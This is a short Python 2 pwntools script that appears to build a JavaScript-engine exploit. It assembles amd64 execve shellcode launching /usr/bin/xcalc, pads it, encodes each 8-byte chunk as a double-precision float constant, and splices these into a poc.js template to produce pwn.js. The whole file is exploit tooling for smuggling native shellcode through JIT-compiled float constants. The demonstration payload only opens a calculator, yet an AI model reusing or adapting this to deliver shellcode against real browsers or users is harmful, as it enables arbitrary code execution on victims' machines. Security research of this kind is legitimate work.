from pwn import *
import struct

context.arch = "amd64"
shellcode = asm(shellcraft.pushstr("/usr/bin/xcalc"))+asm("""
mov rdi,rsp
mov rsi,0
mov rdx,0
mov rax,0x3b
syscall
""")
print disasm(shellcode)
shellcode += (8-len(shellcode)%8)*"\x90"

payload = ""

for i in range(0,len(shellcode),8):
    val  = struct.unpack("<d",shellcode[i:i+8])[0];
    payload += "a{} = {};\n".format(i,repr(val))
data = open("poc.js").read().replace("BILLYSHELL",payload)
open("pwn.js","w").write(data)




